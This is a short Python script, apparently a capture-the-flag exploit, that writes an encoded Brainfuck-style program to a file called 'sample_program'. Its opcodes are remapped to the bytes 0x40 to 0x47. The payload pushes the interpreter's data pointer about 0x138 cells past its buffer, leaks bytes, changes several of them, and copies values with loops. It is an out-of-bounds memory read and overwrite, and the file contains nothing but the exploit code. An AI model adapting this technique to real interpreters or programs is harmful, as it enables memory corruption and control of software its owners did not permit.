file1 = open('sample_program', 'wb')

bf_chars = '>]<[,.-+'
bf_payload = '>' * (0x130 + 0x8) + '.' + '-' * 58  + '>' + '-' * 0x2 + '>' + '+' * 12

bf_payload += '<' * (8 + 2) + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>' * 0x10 + ']' + '.' + '<' * 0x10
bf_payload += '>' + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>' * 0x10 + ']' + '.'  + '<' * 0x10 + '+' * 0x10
bf_payload += ('>' + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>' * 0x10 + ']' + '.'  + '<' * 0x10) * 4

plain = b'\x40\x41\x42\x43\x44\x45\x46\x47'
for char in bf_payload:
	index = bf_chars.find(char)
	file1.write(chr(plain[index]).encode('ascii'))

file1.close()

